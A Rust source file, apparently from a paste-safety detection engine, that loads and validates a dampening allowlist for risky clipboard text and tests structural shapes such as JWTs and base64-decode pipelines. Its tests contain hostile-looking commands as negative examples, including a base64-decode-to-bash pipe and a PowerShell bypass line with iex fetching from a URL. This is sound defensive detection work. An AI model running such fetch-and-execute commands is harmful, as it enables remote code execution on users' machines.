//! Dampening allowlist. See `rules/allowlist.toml` for the principle.

use crate::types::{Observation, Target};
use crate::util::{has_interpreter_token, re};
use crate::EngineError;
use base64::Engine as _;
use regex::Regex;
use serde::{Deserialize, Serialize};
use std::sync::LazyLock;

#[derive(Debug, Clone, Deserialize)]
#[serde(untagged)]
enum OneOrMany {
    One(String),
    Many(Vec<String>),
}

impl OneOrMany {
    fn into_vec(self) -> Vec<String> {
        match self {
            OneOrMany::One(s) => vec![s],
            OneOrMany::Many(v) => v,
        }
    }
}

#[derive(Debug, Deserialize)]
struct AllowFile {
    #[serde(rename = "allow", default)]
    entries: Vec<RawEntry>,
}

#[derive(Debug, Deserialize)]
#[serde(deny_unknown_fields)]
struct RawEntry {
    id: String,
    tier: Tier,
    reason: String,
    dampens: Vec<String>,
    weight: f64,
    requires: RawRequires,
}

#[derive(Debug, Default, Deserialize)]
#[serde(deny_unknown_fields)]
struct RawRequires {
    origin_class: Option<OneOrMany>,
    target: Option<OneOrMany>,
    shell: Option<OneOrMany>,
    role: Option<OneOrMany>,
    source_app: Option<OneOrMany>,
    shape: Option<OneOrMany>,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum Tier {
    Context,
    Shape,
    Literal,
}

/// Structural assertions an attacker's payload cannot satisfy without becoming benign.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
#[serde(rename_all = "snake_case")]
pub enum Shape {
    Jwt,
    Pem,
    PipelineEndsBase64Decode,
    HexDigest,
    EnvLines,
    NoInterpreterToken,
    PowershellFileLocal,
}

impl Shape {
    fn parse(s: &str) -> Option<Shape> {
        Some(match s {
            "jwt" => Shape::Jwt,
            "pem" => Shape::Pem,
            "pipeline_ends_base64_decode" => Shape::PipelineEndsBase64Decode,
            "hex_digest" => Shape::HexDigest,
            "env_lines" => Shape::EnvLines,
            "no_interpreter_token" => Shape::NoInterpreterToken,
            "powershell_file_local" => Shape::PowershellFileLocal,
            _ => return None,
        })
    }

    /// Checked against the RAW text (layer 0). A shape must hold for what the user
    /// actually copied, not for something we decoded out of it.
    pub fn holds(self, text: &str) -> bool {
        let t = text.trim();
        match self {
            Shape::Jwt => is_jwt(t),
            Shape::Pem => PEM.is_match(t),
            Shape::PipelineEndsBase64Decode => PIPE_B64D.is_match(t),
            Shape::HexDigest => HEX_DIGEST.is_match(t),
            Shape::EnvLines => {
                let lines: Vec<&str> = t
                    .lines()
                    .map(str::trim)
                    .filter(|l| !l.is_empty() && !l.starts_with('#'))
                    .collect();
                !lines.is_empty() && lines.iter().all(|l| ENV_LINE.is_match(l))
            }
            Shape::NoInterpreterToken => !has_interpreter_token(t),
            Shape::PowershellFileLocal => {
                PS_FILE.is_match(t)
                    && !PS_INLINE.is_match(t)
                    && !t.to_ascii_lowercase().contains("http")
            }
        }
    }
}

static PEM: LazyLock<Regex> =
    LazyLock::new(|| re(r"-----BEGIN [A-Z0-9 ]+-----[\s\S]*-----END [A-Z0-9 ]+-----"));
static PIPE_B64D: LazyLock<Regex> =
    LazyLock::new(|| re(r"\|\s*base64\s+(?:-d|--decode|-D)\s*(?:;?\s*echo\s*)?$"));
static HEX_DIGEST: LazyLock<Regex> =
    LazyLock::new(|| re(r"^(?:[0-9a-f]{32}|[0-9a-f]{40}|[0-9a-f]{64}|[0-9a-f]{128})$"));
static ENV_LINE: LazyLock<Regex> = LazyLock::new(|| {
    re(r#"^(?:export\s+)?[A-Z_][A-Z0-9_.]*\s*=\s*\S*$|^"[^"]+"\s*:\s*"[^"]*",?$|^[{}],?$"#)
});
static PS_FILE: LazyLock<Regex> = LazyLock::new(|| {
    re(r"\b(?:powershell|pwsh)(?:\.exe)?\b.*\s-f(?:ile)?\s+[\x22']?(?:[a-z]:\\|\\\\|\.\\)")
});
static PS_INLINE: LazyLock<Regex> = LazyLock::new(|| {
    re(r"\s[-/](?:c|co|com|comm|comma|comman|command|e|ec|en|enc|encodedcommand)\b")
});

fn is_jwt(t: &str) -> bool {
    let parts: Vec<&str> = t.split('.').collect();
    if parts.len() != 3
        || parts
            .iter()
            .any(|p| p.is_empty() && p != parts.last().unwrap())
    {
        return false;
    }
    if !parts.iter().all(|p| {
        p.bytes()
            .all(|b| b.is_ascii_alphanumeric() || b == b'-' || b == b'_')
    }) {
        return false;
    }
    let header =
        base64::engine::general_purpose::URL_SAFE_NO_PAD.decode(parts[0].trim_end_matches('='));
    match header {
        Ok(h) => {
            let h = String::from_utf8_lossy(&h);
            h.trim_start().starts_with('{') && h.contains("\"alg\"")
        }
        Err(_) => false,
    }
}

#[derive(Debug, Clone, Default, Serialize)]
pub struct Requires {
    pub origin_class: Vec<String>,
    pub target: Vec<String>,
    pub shell: Vec<String>,
    pub role: Vec<String>,
    pub source_app: Vec<String>,
    pub shape: Vec<Shape>,
}

#[derive(Debug, Clone, Serialize)]
pub struct AllowEntry {
    pub id: String,
    pub tier: Tier,
    pub reason: String,
    pub dampens: Vec<String>,
    pub weight: f64,
    pub requires: Requires,
}

impl AllowEntry {
    pub fn matches(&self, obs: &Observation) -> bool {
        let r = &self.requires;
        let any = |list: &[String], v: &str| {
            list.is_empty() || list.iter().any(|x| x.eq_ignore_ascii_case(v))
        };
        if !any(&r.origin_class, obs.origin.class().as_str()) {
            return false;
        }
        if !any(&r.target, obs.target.as_str()) {
            return false;
        }
        if !r.shell.is_empty() {
            match &obs.target {
                Target::Terminal { shell } if any(&r.shell, shell) => {}
                _ => return false,
            }
        }
        if !any(&r.role, obs.role.as_str()) {
            return false;
        }
        if !r.source_app.is_empty() {
            match obs.origin.app_name() {
                Some(app)
                    if r.source_app
                        .iter()
                        .any(|a| app.to_ascii_lowercase().contains(&a.to_ascii_lowercase())) => {}
                _ => return false,
            }
        }
        r.shape.iter().all(|s| s.holds(&obs.text))
    }
}

#[derive(Debug, Clone, Default)]
pub struct Allowlist {
    pub entries: Vec<AllowEntry>,
}

impl Allowlist {
    pub fn empty() -> Self {
        Self::default()
    }

    /// Parse and validate. `known_features` must contain every feature an entry dampens.
    pub fn from_toml(src: &str, known_features: &[String]) -> Result<Self, EngineError> {
        let file: AllowFile =
            toml::from_str(src).map_err(|e| EngineError::Allowlist(e.to_string()))?;
        let mut entries = Vec::new();
        let mut ids = std::collections::HashSet::new();
        for raw in file.entries {
            let err = |m: String| EngineError::Allowlist(format!("{}: {m}", raw.id));
            if !ids.insert(raw.id.clone()) {
                return Err(err("duplicate id".into()));
            }
            if raw.weight >= 0.0 {
                return Err(err("weight must be negative (entries only dampen)".into()));
            }
            if raw.dampens.is_empty() {
                return Err(err("must dampen at least one named feature".into()));
            }
            for f in &raw.dampens {
                if !known_features.contains(f) {
                    return Err(err(format!("unknown feature {f}")));
                }
            }
            let v = |o: Option<OneOrMany>| o.map(OneOrMany::into_vec).unwrap_or_default();
            let shape = v(raw.requires.shape)
                .iter()
                .map(|s| Shape::parse(s).ok_or_else(|| err(format!("unknown shape {s}"))))
                .collect::<Result<Vec<_>, _>>()?;
            let requires = Requires {
                origin_class: v(raw.requires.origin_class),
                target: v(raw.requires.target),
                shell: v(raw.requires.shell),
                role: v(raw.requires.role),
                source_app: v(raw.requires.source_app),
                shape,
            };
            // The core invariant: at least one fact the attacker does not control.
            // Target and role alone are not enough (attackers aim at terminals and admins).
            let anchored = requires.origin_class.iter().any(|c| c != "unknown")
                || !requires.source_app.is_empty()
                || requires
                    .shape
                    .iter()
                    .any(|s| *s != Shape::NoInterpreterToken);
            if !anchored {
                return Err(err(
                    "needs a non-attacker-controlled anchor: origin_class (not unknown), source_app, or a structural shape".into(),
                ));
            }
            match raw.tier {
                Tier::Context if requires.origin_class.is_empty() => {
                    return Err(err("context entries require origin_class".into()))
                }
                Tier::Shape if requires.shape.is_empty() => {
                    return Err(err("shape entries require shape".into()))
                }
                Tier::Literal if requires.source_app.is_empty() => {
                    return Err(err(
                        "literal entries require an OS-level anchor (source_app)".into(),
                    ))
                }
                _ => {}
            }
            entries.push(AllowEntry {
                id: raw.id,
                tier: raw.tier,
                reason: raw.reason,
                dampens: raw.dampens,
                weight: raw.weight,
                requires,
            });
        }
        Ok(Self { entries })
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn feats() -> Vec<String> {
        vec!["fetch_and_execute".into(), "interpreter_entropy".into()]
    }

    #[test]
    fn rejects_unanchored_entries() {
        let src = r#"
[[allow]]
id = "bad"
tier = "context"
reason = "x"
dampens = ["fetch_and_execute"]
weight = -0.5
requires = { target = "terminal", role = "admin" }
"#;
        assert!(Allowlist::from_toml(src, &feats()).is_err());
    }

    #[test]
    fn rejects_unknown_origin_as_anchor() {
        let src = r#"
[[allow]]
id = "bad"
tier = "context"
reason = "x"
dampens = ["fetch_and_execute"]
weight = -0.5
requires = { origin_class = "unknown" }
"#;
        assert!(Allowlist::from_toml(src, &feats()).is_err());
    }

    #[test]
    fn rejects_literal_command_field() {
        let src = r#"
[[allow]]
id = "bad"
tier = "literal"
reason = "x"
dampens = ["fetch_and_execute"]
weight = -0.5
requires = { command = "curl https://sh.rustup.rs | sh" }
"#;
        assert!(Allowlist::from_toml(src, &feats()).is_err());
    }

    #[test]
    fn rejects_positive_weight() {
        let src = r#"
[[allow]]
id = "bad"
tier = "shape"
reason = "x"
dampens = ["interpreter_entropy"]
weight = 0.5
requires = { shape = "jwt" }
"#;
        assert!(Allowlist::from_toml(src, &feats()).is_err());
    }

    #[test]
    fn shapes() {
        assert!(Shape::Jwt.holds("eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"));
        assert!(!Shape::Jwt.holds("powershell.exe.foo"));
        assert!(Shape::PipelineEndsBase64Decode
            .holds("kubectl get secret db -o jsonpath='{.data.password}' | base64 -d"));
        assert!(!Shape::PipelineEndsBase64Decode.holds("echo aGk= | base64 -d | bash"));
        assert!(Shape::HexDigest.holds("3f786850e387550fdab836ed7e6dc881de23001b"));
        assert!(Shape::EnvLines.holds("DATABASE_URL=postgres://u:p@h/db\nAPI_KEY=sk_live_abc123"));
        assert!(Shape::PowershellFileLocal.holds(
            r"powershell.exe -NoProfile -ExecutionPolicy Bypass -File \\server\share\script.ps1"
        ));
        assert!(!Shape::PowershellFileLocal
            .holds(r"powershell -ep bypass -File C:\a.ps1 -c iex(iwr http://x)"));
    }
}
